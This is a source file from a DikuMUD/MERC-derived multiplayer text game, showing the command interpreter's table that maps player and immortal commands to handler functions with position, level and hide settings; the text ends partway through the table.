/***************************************************************************
 *  file: interp.c , Command interpreter module.      Part of DIKUMUD      *
 *  Usage: Procedures interpreting user command                            *
 *  Copyright (C) 1990, 1991 - see 'license.doc' for complete information. *
 *                                                                         *
 *  Copyright (C) 1992, 1993 Michael Chastain, Michael Quan, Mitchell Tse  *
 *  Performance optimization and bug fixes by MERC Industries.             *
 *  You can use our stuff in any way you like whatsoever so long as ths   *
 *  copyright notice remains intact.  If you like it please drop a line    *
 *  to mec\@garnet.berkeley.edu.                                            *
 *                                                                         *
 *  This is free software and you are benefitting.  We hope that you       *
 *  share your changes too.  What goes around, comes around.               *
 ***************************************************************************/
/* Revision History                                                        */
/* 12/08/2003   Onager   Added chop_half() to work like half_chop() but    */
/*                       chopping off the last word.                       */
/***************************************************************************/
/* $Id: interp.cpp,v 1.111 2006/11/25 04:15:09 jhhudso Exp $ */

extern "C"
{
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdio.h>
/*#include <memory.h>*/
}
#ifdef LEAK_CHECK
#include <dmalloc.h>
#endif

#include <structs.h> // MAX_STRING_LENGTH
#include <character.h> // POSITION_*
#include <interp.h>
#include <levels.h>
#include <utility.h>
#include <player.h>
#include <fight.h>
#include <mobile.h>
#include <connect.h> // descriptor_data
#include <room.h>
#include <db.h>
#include <act.h>
#include <returnvals.h>
#include <terminal.h>

#define SKILL_HIDE 337

extern bool check_social( CHAR_DATA *ch, char *pcomm,
    int length, char *arg );

extern struct index_data *mob_index;
extern struct index_data *obj_index;
extern CWorld world;

// globals to store last command that was done.
// this is used for debugging.  We output it in case of a crash
// to the log files.  (char name is so long, in case it was a mob)
char last_processed_cmd[MAX_INPUT_LENGTH];
char last_char_name[MAX_INPUT_LENGTH];
int  last_char_room;

void update_wizlist(CHAR_DATA *ch);
// int system(const char *); 

void add_command_to_radix(struct command_info *cmd);


// Temp removal to perfect system. 1/25/06 Eas
// WARNING WARNING WARNING WARNING WARNING
// The command list was modified to account for toggle_hide.
// The last integer will affect a char being removed from hide when they perform the command.
// 0  - char will always become visibile.
// 1  - char will not become visible when using this command.
// 2+ - char has a greater chance of breaking hide as this increases.
// These numbers are overruled by the act() STAYHIDE flag.
// Eas 1/21/06
//
// The command number should be 9 for any user command that is not used 
// in a spec_proc.  If it is, then it should be a number that is not
// already in use.
struct command_info cmd_info[] =
{
    // Movement commands
    { "north",	do_move,	POSITION_STANDING, 0, 1,  COM_CHARMIE_OK, 1 },
    { "east",	do_move,	POSITION_STANDING, 0, 2,  COM_CHARMIE_OK, 1 },
    { "south",	do_move,	POSITION_STANDING, 0, 3,  COM_CHARMIE_OK, 1 },
    { "west",	do_move,	POSITION_STANDING, 0, 4,  COM_CHARMIE_OK, 1 },
    { "up",	do_move,	POSITION_STANDING, 0, 5,  COM_CHARMIE_OK, 1 },
    { "down",	do_move,	POSITION_STANDING, 0, 6,  COM_CHARMIE_OK, 1 },

    // Common commands
    { "newbie",		do_newbie,	POSITION_DEAD, 0, 9, 0, 1 },    
    { "cast",		do_cast,	POSITION_SITTING, 0, 9, 0, 0 },
    { "sing",		do_sing,	POSITION_RESTING, 0, 9, 0, 0 },
    { "exits",		do_exits,	POSITION_RESTING, 0, 9, 0, 1 },
    { "f",		do_fire,	POSITION_FIGHTING, 1, 9, 0, 25 },
    { "get",		do_get,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "inventory",	do_inventory,	POSITION_DEAD, 0, 9, 0, 1 },
    { "inventoryb",	do_spam,	POSITION_DEAD, 0, 9, 0, 1 },
    { "k",		do_kill,	POSITION_FIGHTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "ki",		do_ki,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "kill",		do_kill,	POSITION_FIGHTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "look",		do_look,	POSITION_RESTING, 0, 12, COM_CHARMIE_OK, 1 },
    { "glance",		do_look,	POSITION_RESTING, 0, 20, COM_CHARMIE_OK, 1 },
    { "order",		do_order,	POSITION_RESTING, 0, 9, 0, 0 },
    { "rest",		do_rest,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "recite",		do_recite,	POSITION_RESTING, 0, 9, 0, 0 },
    { "recall",		do_recall,	POSITION_RESTING, 0, 9, 0, 1 },
    { "score",		do_score,	POSITION_DEAD, 0, 9, 0, 1 },
    { "scan",		do_scan,	POSITION_RESTING, 1, 9, 0, 25 },
    { "stand",		do_stand,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "switch",		do_switch,	POSITION_RESTING, 0, 9, 0, 25 },
    { "tell",		do_tell,	POSITION_PARALYZED, 0, 9, 0, 1 },
    { "wield",		do_wield,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "innate",		do_innate,	POSITION_SLEEPING, 0, 9, 0, 1 },

    // Informational commands
    { "alias",		do_alias,	POSITION_DEAD, 0, 9, 0, 1 },
    { "toggle",		do_toggle,	POSITION_DEAD, 0, 9, 0, 1 },
    { "consider",	do_consider,	POSITION_RESTING, 0, 9, 0, 1 },
    { "configure",		do_toggle,	POSITION_DEAD, 0, 9, 0, 1 },
    { "credits",	do_credits,	POSITION_DEAD, 0, 9, 0, 1 },
    { "equipment",	do_equipment,	POSITION_DEAD, 0, 9, 0, 1 },
    { "ohelp",		do_help,	POSITION_DEAD, 0, 9, 0, 1 },
    { "help",		do_new_help,	POSITION_DEAD, 0, 9, 0, 1 },
    { "idea",		do_idea,	POSITION_DEAD, 0, 9, 0, 1 },
    { "info",		do_info,	POSITION_DEAD, 0, 9, 0, 1 },
    { "leaderboard",    do_leaderboard, POSITION_DEAD, 3, 9, 0, 1},
    { "news",		do_news,	POSITION_DEAD, 0, 9, 0, 1 },
    { "thenews",	do_news,	POSITION_DEAD, 0, 9, 0, 1 },
    { "story",		do_story,	POSITION_DEAD, 0, 9, 0, 1 },
    { "tick",		do_tick,	POSITION_DEAD, 0, 9, 0, 0 },
    { "time",		do_time,	POSITION_DEAD, 0, 9, 0, 1 },
    { "title",		do_title,	POSITION_DEAD, 0, 9, 0, 1 },
    { "typo",		do_typo,	POSITION_DEAD, 0, 9, 0, 1 },
    { "weather",	do_weather,	POSITION_DEAD, 0, 9, 0, 1 },
    { "who",		do_who,		POSITION_DEAD, 0, 9, 0, 1 },
    { "wizlist",	do_wizlist,	POSITION_DEAD, 0, 9, 0, 1 },
    { "socials",	do_social,	POSITION_DEAD, 0, 9, 0, 0 },
    { "index",		do_index,	POSITION_DEAD, 0, 9, 0, 1 },
    { "areas",		do_areas,	POSITION_DEAD, 0, 9, 0, 1 },
    { "commands", 	do_new_help,	POSITION_DEAD, 0, 9, 0, 1 },
    { "experience",	do_show_exp,	POSITION_DEAD, 0, 9, 0, 1 },

    // Communication commands
    { "ask",		do_ask,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "auction",	do_auction,	POSITION_RESTING, 0, 9, 0, 1 },
    { "awaymsgs",	do_awaymsgs,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "channel",	do_channel,	POSITION_DEAD, 0, 9, 0, 1 },
    { "dream",		do_dream,	POSITION_DEAD, 0, 9, 0, 1 },
    { "emote",		do_emote,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { ":",		do_emote,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },    
    { "gossip",		do_gossip,	POSITION_DEAD, 0, 9, 0, 1 },
    { "trivia",		do_trivia,	POSITION_DEAD, 0, 9, 0, 1 },
    { "gtell",		do_grouptell,	POSITION_DEAD, 0, 9, 0, 1 },
    { ".",		do_grouptell,	POSITION_DEAD, 0, 9, 0, 1 },
    { "ignore",		do_ignore,	POSITION_DEAD, 0, 9, 0, 1 },
    { "insult",		do_insult,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "reply",		do_reply,	POSITION_RESTING, 0, 9, 0, 1 },
    { "report",		do_report,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "say",		do_say,		POSITION_RESTING, 0, 11, COM_CHARMIE_OK, 0 },
    { "psay",		do_psay,	POSITION_RESTING, 0, 11, COM_CHARMIE_OK, 0 },
    { "'",		do_say,		POSITION_RESTING, 0, 11, COM_CHARMIE_OK, 0 },
    { "shout",		do_shout,	POSITION_RESTING, 0, 9, 0, 1 },
    { "whisper",	do_whisper,	POSITION_RESTING, 0, 9, 0, 0 },

    // Object manipulation
    { "slip",		do_slip,	POSITION_STANDING, 0,  87, 0, 1 },
    { "close",		do_close,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "donate",		do_donate,	POSITION_RESTING, 0, 90, COM_CHARMIE_OK, 1 },
    { "drink",		do_drink,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "drop",		do_drop,	POSITION_RESTING, 0, 89, COM_CHARMIE_OK, 25 },
    { "eat",		do_eat,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "fill",		do_fill,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "give",		do_give,	POSITION_RESTING, 0, 88, COM_CHARMIE_OK, 25 },
    { "grab",		do_grab,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "hold",		do_grab,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "lock",		do_lock,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "open",		do_open,	POSITION_RESTING, 0, 98, COM_CHARMIE_OK, 25 },
    { "pour",		do_pour,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "put",		do_put,		POSITION_RESTING, 0, 93, COM_CHARMIE_OK, 0 },
    { "quaff",		do_quaff,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "read",		do_read,	POSITION_RESTING, 0, 67, 0, 1 },
    { "remove",		do_remove,	POSITION_RESTING, 0, 69, COM_CHARMIE_OK, 25 },
    { "erase",		do_not_here,	POSITION_RESTING, 0, 70, 0, 0 },
    { "sip",		do_sip,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "track",		do_track,	POSITION_STANDING, 0, 10, 0, 10 },
    { "take",		do_get,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "palm",		do_get,		POSITION_RESTING, 3, 10, 0, 1 },
    { "sacrifice",	do_tap,		POSITION_RESTING, 0, 92, COM_CHARMIE_OK, 25 },
    { "taste",		do_taste,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "unlock",		do_unlock,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "use",		do_use,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    { "wear",		do_wear,	POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 25 },
    //  { "poisonmaking", do_poisonmaking, POSITION_RESTING, 0, 9,   0, 0 },
    
    // Combat commands
    { "bash",		do_bash,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "retreat",	do_retreat,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "disarm",		do_disarm,	POSITION_FIGHTING, 2, 9, 0, 0 },
    { "flee",		do_flee,	POSITION_FIGHTING, 0, 28, COM_CHARMIE_OK, 0 }, 
    { "hit",		do_hit,		POSITION_FIGHTING, 0, 194, COM_CHARMIE_OK, 0 },
    { "join",		do_join,	POSITION_FIGHTING, 0, 9, COM_CHARMIE_OK, 0 },

// Junk movedso join precedes it
    { "junk",		do_tap,		POSITION_RESTING, 0, 92, COM_CHARMIE_OK, 25 },

    { "murder",		do_murder,	POSITION_FIGHTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "rescue",		do_rescue,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "trip",		do_trip,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "deathstroke",	do_deathstroke,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "circle",		do_circle,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "kick",		do_kick,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "battlecry",	do_battlecry,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "rage",		do_rage,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "berserk",	do_berserk,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "golemscore",	do_golem_score,	POSITION_DEAD, 1, 9, 0, 1 },
    { "stun",		do_stun,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "redirect",	do_redirect,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "hitall",		do_hitall,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "quiveringpalm",	do_quivering_palm,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "eagleclaw",	do_eagle_claw,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "headbutt",	do_headbutt,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "cripple",	do_cripple,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "fire",		do_fire,	POSITION_FIGHTING, 1, 9, 0, 25 },
    { "layhands",	do_layhands,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "harmtouch",	do_harmtouch,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "bloodfury",	do_bloodfury,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "bladeshield",	do_bladeshield,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "repelance",	do_focused_repelance,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "vitalstrike",	do_vitalstrike,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "crazedassault",	do_crazedassault,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "bullrush",	do_bullrush,	POSITION_STANDING, 1, 9, 0, 0 },
    { "ferocity",	do_ferocity,	POSITION_STANDING, 1, 9, 0, 0 },
    { "tactics",	do_tactics,	POSITION_STANDING, 1, 9, 0, 0 },
    { "deceit",		do_deceit,	POSITION_STANDING, 1, 9, 0, 0 },
    { "knockback",	do_knockback,	POSITION_FIGHTING, 1, 9, 0, 0 },
    { "appraise",	do_appraise,	POSITION_STANDING, 1, 9, 0, 1 },

    // Position commands
    { "sit",	do_sit,		POSITION_RESTING, 0, 9, COM_CHARMIE_OK, 0 },
    { "sleep",	do_sleep,	POSITION_SLEEPING, 0, 9, 0, 0 },
    { "wake",	do_wake,	POSITION_SLEEPING, 0, 9, 0, 0 },
    
    // Miscellaneous commands
    { "autojoin",	do_autojoin,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "visible",	do_visible,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "ctell",		do_ctell,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "outcast",	do_outcast,	POSITION_RESTING, 0, 9, 0, 1 },
    { "accept",		do_accept,	POSITION_RESTING, 0, 9, 0, 1 },
    { "whoclan",	do_whoclan,	POSITION_DEAD, 0, 9, 0, 1 },
    { "cpromote",	do_cpromote,	POSITION_RESTING, 0, 9, 0, 1 },
    { "clans",		do_clans,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "clanarea",      do_clanarea,     POSITION_RESTING, 11, 9, 0, 1 },
    { "cinfo",		do_cinfo,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "ambush",		do_ambush,	POSITION_RESTING, 0, 9, 0, 1 },
    { "whoarena",	do_whoarena,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "joinarena",	do_joinarena,	POSITION_SLEEPING, 0, 9, 0, 0 },
    { "backstab",	do_backstab,	POSITION_STANDING, 0, 9, 0, 0 },
    { "bs",		do_backstab,	POSITION_STANDING, 0, 9, 0, 0 },
    { "boss",		do_boss,	POSITION_DEAD, 0, 9, 0, 1 },
    { "blackjack",	do_blackjack,	POSITION_STANDING, 0, 9, 0, 0 },
    { "enter",		do_enter,	POSITION_STANDING, 0, 60, COM_CHARMIE_OK, 20 },
    { "climb",		do_climb,	POSITION_STANDING, 0, 60, COM_CHARMIE_OK, 20 },
    { "examine",	do_examine,	POSITION_RESTING, 0, 9, 0, 1 },
    { "follow",		do_follow,	POSITION_RESTING, 0, 9, 0, 0 },
    { "stalk",		do_stalk,	POSITION_STANDING, 6, 9, 0, 10 },
    { "group",		do_group,	POSITION_SLEEPING, 0, 9, 0, 0 },
    { "found",		do_found,	POSITION_RESTING, 0, 9, 0, 0 },
    { "disband",	do_disband,	POSITION_RESTING, 0, 9, 0, 0 },
    { "abandon",	do_abandon,	POSITION_RESTING, 0, 9, 0, 0 },
    { "consent",	do_consent,	POSITION_RESTING, 0, 9, 0, 1 },
    { "whogroup",	do_whogroup,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "forage",		do_forage,	POSITION_STANDING, 0, 9, 0, 0 },
    { "whosolo",	do_whosolo,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "count",		do_count,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "hide",		do_hide,	POSITION_RESTING, 0, 9, 0, 0 },
    { "leave",		do_leave,	POSITION_STANDING, 0, 187, COM_CHARMIE_OK, 20 },
    { "name",		do_name,	POSITION_DEAD, 1, 9, 0, 1 },
    { "pick",		do_pick,	POSITION_STANDING, 0, 35, 0, 20 },
    { "quest",          do_quest,       POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "qui",		do_qui,		POSITION_DEAD, 0, 9, 0, 1 },
    { "levels",		do_levels,	POSITION_DEAD, 0, 9, 0, 1 },
    { "quit",		do_quit,	POSITION_DEAD, 0, 91, 0, 1 },
    { "return",		do_return,	POSITION_DEAD, 0, 9, COM_CHARMIE_OK, 1 },
    { "tame",		do_tame,	POSITION_RESTING, 0, 9, 0, 0 },
    { "prompt",		do_prompt,	POSITION_DEAD, 0, 9, 0, 1 },
    { "save",		do_save,	POSITION_DEAD, 0, 9, 0, 1 },
    { "sneak",		do_sneak,	POSITION_STANDING, 1, 9, 0, 0 },
    { "home",		do_home,	POSITION_DEAD, 0, 9, 0, 1 },
    { "split",		do_split,	POSITION_RESTING, 0, 193, 0, 0 },
    { "spells",		do_spells,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "skills",		do_skills,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "songs",		do_songs,	POSITION_SLEEPING, 0, 9, 0, 1 },
    { "steal",		do_steal,	POSITION_STANDING, 1, 9, 0, 10 },
    { "pocket",		do_pocket,	POSITION_STANDING, 1, 9, 0, 10 },
    { "motd",		do_motd,	POSITION_DEAD, 0, 9, 0, 1 },
    { "cmotd",		do_cmotd,	POSITION_DEAD, 0, 9, 0, 1 },
    { "cbalance",	do_cbalance,	POSITION_STANDING, 0, 9, 0, 0 },
    { "cdeposit",	do_cdeposit,	POSITION_STANDING, 0, 9, 0, 0 },
    { "cwithdraw",	do_cwithdraw,	POSITION_STANDING, 0, 9, 0, 0 },
    { "ctax",		do_ctax,	POSITION_STANDING, 0, 9, 0, 1 },
    { "where",		do_where,	POSITION_RESTING, 0, 9, 0, 1 },
    { "write",		do_write,	POSITION_STANDING, 0, 128, 0, 0 },
    { "beacon",		do_beacon,	POSITION_RESTING, 0, 9, 0, 1 },
    { "leak",		do_memoryleak,	POSITION_RESTING, 0, 9, 0, 1 },
    { "beep",		do_beep,	POSITION_DEAD, 0, 9, 0, 1 },
    { "guard",		do_guard,	POSITION_RESTING, 0, 9, 0, 0 },
    { "release",	do_release,	POSITION_STANDING, 0, 9, 0, 1 },
    { "eyegouge",	do_eyegouge,	POSITION_FIGHTING, 0, 9, 0, 0 },
    { "vault",		do_vault,	POSITION_DEAD, 10, 9, 0, 0},    
    { "suicide",        do_suicide,     POSITION_RESTING, 0, 9, 0, 0},

    // Special procedure commands
    { "design",		do_not_here,	POSITION_STANDING, 0, 62, 0, 0 },
    { "stock",		do_not_here,	POSITION_STANDING, 0, 61, 0, 0 },
    { "buy",		do_not_here,	POSITION_STANDING, 0, 56, 0, 0 },
    { "sell",		do_not_here,	POSITION_STANDING, 0, 57, 0, 0 },
    { "value",		do_not_here,	POSITION_STANDING, 0, 58, 0, 0 },
    { "watch",		do_not_here,	POSITION_STANDING, 0, 155, 0, 0},
    { "list",		do_not_here,	POSITION_STANDING, 0, 59, 0, 0 },
    { "repair",		do_not_here,	POSITION_STANDING, 0, 66, 0, 0 },
    { "practice",	do_practice,	POSITION_SLEEPING, 1, 164, 0, 0 },
    { "practise",	do_practice,	POSITION_SLEEPING, 1, 164, 0, 0 },
    { "pray",		do_pray,	POSITION_RESTING, 0, 9, 0, 1 },
    { "promote",	do_promote,	POSITION_STANDING, 1, 9, 0, 0 },
    { "price",		do_not_here,	POSITION_RESTING, 1, 65, 0, 0 },
    { "train",		do_not_here,	POSITION_RESTING, 1, 165, 0, 0 },
    { "gain",		do_not_here,	POSITION_STANDING, 1, 171, 0, 0 },
    { "balance",	do_not_here,	POSITION_STANDING, 0, 172, 0, 0 },
    { "deposit",	do_not_here,	POSITION_STANDING, 0, 173, 0, 0 },
    { "withdraw",	do_not_here,	POSITION_STANDING, 0, 174, 0, 0 },
    { "clean",		do_not_here,	POSITION_RESTING, 0, 177, 0, 0 },
    { "play",		do_not_here,	POSITION_RESTING, 0, 178, 0, 0 },
    { "finish",		do_not_here,	POSITION_RESTING, 0, 179, 0, 0 },
    { "veternarian",	do_not_here,	POSITION_RESTING, 0, 180, 0, 0 },
    { "feed",		do_not_here,	POSITION_RESTING, 0, 181, 0, 0 },
    { "assemble",	do_not_here,	POSITION_RESTING, 0, 182, 0, 0 },
    { "pay",		do_not_here,	POSITION_STANDING, 0, 183, 0, 0 },
    { "restring",	do_not_here,	POSITION_STANDING, 0, 184, 0, 0 },
    { "push",		do_not_here,	POSITION_STANDING, 0, 185, 0, 0 },
    { "pull",		do_not_here,	POSITION_STANDING, 0, 186, 0, 0 },
    { "gaze",		do_not_here,	POSITION_STANDING, 0, 1820, 0, 0 },
    { "tremor",		do_not_here,	POSITION_FIGHTING, 0, 188, 0, 0 },
    { "bet",		do_not_here,	POSITION_STANDING, 0, 189, 0, 0 },
    { "insurance",		do_not_here,	POSITION_STANDING, 0, 190, 0, 0 },
    { "double",		do_not_here,	POSITION_STANDING, 0, 191, 0, 0 },
    { "stay",		do_not_here,	POSITION_STANDING, 0, 192, 0, 0 },

    { "select",		do_natural_selection, POSITION_RESTING, 0, 9, 0, 0},
     
    // Immortal commands
    { "fixvault", do_fixvault, POSITION_DEAD, IMP, 9, 0, 1},
    { "thunder",	do_thunder,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "wizlock",	do_wizlock,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "processes",	do_processes,	POSITION_DEAD, 108, 9, 0, 1 },
    { "bestow",		do_bestow,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "oclone",		do_oclone,	POSITION_DEAD, 103, 9, 0, 1 },
    { "mclone",		do_mclone,	POSITION_DEAD, 103, 9, 0, 1 },
    { "revoke",		do_revoke,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "chpwd",		do_chpwd,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "advance",	do_advance,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "whattonerf",	do_maxes,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "affclear",	do_clearaff,	POSITION_DEAD, 104, 9, 0, 1 },
    { "guide",		do_guide,	POSITION_DEAD, OVERSEER, 9, 0, 1 },
    { "addnews",	do_addnews,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "linkload",	do_linkload,	POSITION_DEAD, 108, 9, 0, 1 },
    { "listproc",	do_listproc,	POSITION_DEAD, OVERSEER, 9, 0, 1 },
    { "zap",		do_zap,		POSITION_DEAD, 108, 9, 0, 1 },
    { "slay",		do_kill,	POSITION_DEAD, OVERSEER, 9, 0, 1 },
    { "rename",		do_rename_char,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "archive",	do_archive,	POSITION_DEAD, 108, 9, 0, 1 },
    { "unarchive",	do_unarchive,	POSITION_DEAD, 108, 9, 0, 1 },
    { "stealth",	do_stealth,	POSITION_DEAD, OVERSEER, 9, 0, 1 },
    { "disconnect",	do_disconnect,	POSITION_DEAD, OVERSEER, 9, 0, 1 },  
    { "force",		do_force,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "pardon",		do_pardon,	POSITION_DEAD, OVERSEER, 9, 0, 1 },
    { "goto",		do_goto,	POSITION_DEAD, 102, 9, 0, 1 },
    { "restore",	do_restore,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "purloin",	do_purloin,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "set",		do_set,		POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "unban",		do_unban,	POSITION_DEAD, 108, 9, 0, 1 },
    { "ban",		do_ban,		POSITION_DEAD, 108, 9, 0, 1 },
    { "echo",		do_echo,	POSITION_DEAD, 105, 9, 0, 1 },
    {"eqmax",		do_eqmax,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 }, 
    { "send",		do_send,	POSITION_DEAD, 105, 9, 0, 1 },
    { "at",		do_at,		POSITION_DEAD, IMMORTAL, 9, 0, 1 }, 
    { "fakelog",	do_fakelog,	POSITION_DEAD, 110, 9, 0, 1 },
    { "global",		do_global,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "log",		do_log,		POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "snoop",		do_snoop,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "pview",		do_pview,	POSITION_DEAD, 104, 9, 0, 1 },
    { "/",		do_wiz,		POSITION_DEAD, GIFTED_COMMAND, 8, 0, 1 },
    { "arena",		do_arena,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "load",		do_load,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "prize",		do_load,	POSITION_DEAD, GIFTED_COMMAND, 999, 0, 1 },
    { "shutdow",	do_shutdow,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "shutdown",	do_shutdown,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "opedit",		do_opedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "opstat",		do_opstat,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "procedit",	do_mpedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "procstat",	do_mpstat,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "range",		do_range,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "pshopedit",	do_pshopedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "sedit",		do_sedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "sockets",	do_sockets,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "punish",		do_punish,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "sqedit",		do_sqedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "qedit",		do_qedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "install",	do_install,	POSITION_DEAD, IMP, 9, 0, 1 },
    { "hedit",		do_hedit,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "hindex",		do_hindex,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "reload",		do_reload,	POSITION_DEAD, 108, 9, 0, 1 },
    { "plats",		do_plats,	POSITION_DEAD, 108, 9, 0, 1 },
    { "bellow",		do_thunder,	POSITION_DEAD, DEITY, 8, 0, 1 },
    { "string",		do_string,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "transfer",	do_trans,	POSITION_DEAD, DEITY, 9, 0, 1 },
    { "gtrans",		do_gtrans,	POSITION_DEAD, DEITY, 9, 0, 1 },
    { "boot",		do_boot,	POSITION_DEAD, DEITY, 9, 0, 1 },
    { "linkdead",	do_linkdead,	POSITION_DEAD, DEITY, 9, 0, 1 },
    { "teleport",	do_teleport,	POSITION_DEAD, DEITY, 9, 0, 1 },
    { "purge",		do_purge,	POSITION_DEAD, 103, 9, 0, 1 },
    { "show",		do_show,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "fighting", 	do_fighting,	POSITION_DEAD, 104, 9, 0, 1 },
    { "peace",		do_peace,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "check",		do_check,	POSITION_DEAD, 104, 9, 0, 1 },
    { "find",		do_find,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "stat",		do_stat,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "redit",		do_redit,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "oedit",		do_oedit,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "clear",		do_clear,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "repop",		do_repop,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "medit",		do_medit,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "rdelete",	do_rdelete,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "oneway",		do_oneway,	POSITION_DEAD, ANGEL, 1, 0, 1 },
    { "twoway",		do_oneway,	POSITION_DEAD, ANGEL, 2, 0, 1 },
    { "zsave",		do_zsave,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "rsave",		do_rsave,	POSITION_DEAD, ANGEL, 9, 0, 1 },
